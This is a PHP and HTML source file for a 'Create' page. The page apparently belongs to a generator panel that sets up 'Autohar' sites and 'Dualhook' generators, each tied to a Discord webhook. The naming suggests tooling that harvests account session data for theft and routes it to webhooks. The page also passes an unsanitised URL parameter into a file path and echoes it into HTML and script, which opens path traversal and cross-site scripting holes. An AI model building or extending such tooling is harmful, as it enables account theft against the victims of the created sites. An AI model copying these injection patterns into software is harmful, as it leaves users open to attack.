<?php
require("controller/include.php");
$name = $_GET["name"];
if (!file_exists(__DIR__ . "/auth/triplehook/" . $name . ".json")) {
    http_response_code(404);
    die(file_get_contents(__DIR__ . "/404.shtml"));
};
$data = json_decode(file_get_contents(__DIR__ . "/auth/triplehook/" . $name . ".json"), true);
$discord = $data['discord'] ?? null;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?=$name;?> - Create</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf/notyf.min.css">
    <script src="https://cdn.jsdelivr.net/npm/notyf/notyf.min.js"></script>
    <link rel="stylesheet" href="/css/main.css">
    <style>
        .form input {
            display: block;
            margin: 10px 0;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><?=$name?></div>
        <div class="button-group">
            <button id="regular-mode" class="toggle-button">Regular</button>
            <button id="dualhook-mode" class="toggle-button">Dualhook</button>
        </div>
        <p class="description">
            Set up your personalized Autohar site instantly. A sleek design with simple management and fast results.
        </p>
        <div class="form">
            <div id="regular-form" class="form-section">
                <input type="text" placeholder="Site Name" id="site-name">
                <input type="url" placeholder="Site Hook" id="site-url">
                <button id="create-site" class="create-btn">Create Site</button>
            </div>
            <div id="dualhook-form" class="form-section" style="display: none;">
                <input type="text" placeholder="Generator Discord" id="generator-discord">
                <input type="text" placeholder="Generator Name" id="generator-name">
                <input type="url" placeholder="Generator Webhook" id="generator-url">
                <button id="create-dualhook" class="create-btn">Create Dualhook</button>
            </div>
        </div>
        <div class="footer">
            <p>Want to explore more? <a href="<?=$discord;?>">Join our Discord</a></p>
        </div>
    </div>
</body>
<script>
const notyf = new Notyf({
    duration: 5000,
    position: {
        x: "right",
        y: "top",
    }
});

if (document.getElementById('regular-mode')) {
    document.getElementById('regular-mode').addEventListener("click", () => {
        document.getElementById('dualhook-form').style.display = "none";
        document.getElementById('regular-form').style.display = "block";
    });
};

if (document.getElementById('dualhook-mode')) {
    document.getElementById('dualhook-mode').addEventListener("click", () => {
        document.getElementById('regular-form').style.display = "none";
        document.getElementById('dualhook-form').style.display = "block";
    });
};

var create_site = document.getElementById("create-site");
if (create_site) {
    create_site.addEventListener("click", async () => {
        var name = document.getElementById("site-name").value;
        var hook = document.getElementById("site-url").value;
        var secret = "<?=$name;?>";
        const response = await fetch("/controller/apis/create", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({name, hook, secret})
        });
        const data = await response.json();
        if (data && data.error.message && !response.ok) {
            notyf.error(data.error.message);
        } else {
            window.location.href = "/controller/dashboard";
        };
    });
};

var create_dualhook = document.getElementById("create-dualhook");
if (create_dualhook) {
    create_dualhook.addEventListener("click", async () => {
        var name = document.getElementById("generator-name").value;
        var hook = document.getElementById("generator-url").value;
        var discord = document.getElementById("generator-discord").value;
        var secret = "<?=$name;?>";
        const response = await fetch("/controller/apis/create", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({name, hook, discord, secret})
        });
        if (!response.ok) {
            const data = await response.json();
            if (data && data.error && data.error.message) {
                notyf.error(data.error.message);
            }
            return;
        }
        notyf.success("Dualhook Created, Check your webhook!");
    });
};
</script>
</html>